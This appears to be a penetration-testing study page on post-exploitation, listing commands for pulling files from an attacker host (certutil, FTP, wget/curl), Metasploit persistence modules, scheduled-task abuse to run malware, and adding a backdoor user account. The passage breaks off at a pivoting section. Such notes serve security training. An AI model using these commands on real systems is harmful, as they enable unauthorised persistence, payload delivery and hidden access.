---
description: You landed yourself on a box, now what?
---

# Post Exploitation

## File Transfers Review

### Certutil (Windows)

<mark style="color:yellow;">`certutil.exe -urlcache -f http://kali_ip/file.txt file.txt`</mark>

### HTTP Server

<mark style="color:yellow;">`python3 -m http.server <port>`</mark>

### Browser

* Navigate directly to the file

### FTP

Kali: <mark style="color:yellow;">`python -m pyftpdlib 21`</mark>

Windows or Linux: <mark style="color:yellow;">`ftp kali_ip`</mark>

### Additional Linux Exclusives

* Upon hosting an HTTP server, an attacker could utilize <mark style="color:yellow;">`wget`</mark> and <mark style="color:yellow;">`curl`</mark> to remotely grab a file

## Maintaining Access

### Persistence Scripts

* Run persistence -h
* <mark style="color:yellow;">exploit/windows/local/persistence</mark>
* <mark style="color:yellow;">exploit/windows/local/registry\_persistence</mark>

These Metasploit scripts are very dangerous as they tend to open up ports.&#x20;

Simply remember that open ports have no authentication mechanism.

### Scheduled Tasks

* Run scheduleme
* Run schtaskabuse

Instead consider running malware on by scheduling tasks.

### Add a user

* <mark style="color:yellow;">`net user hacker password123 /add`</mark>

## Pivoting

Scenario:

Windows client is on network A-
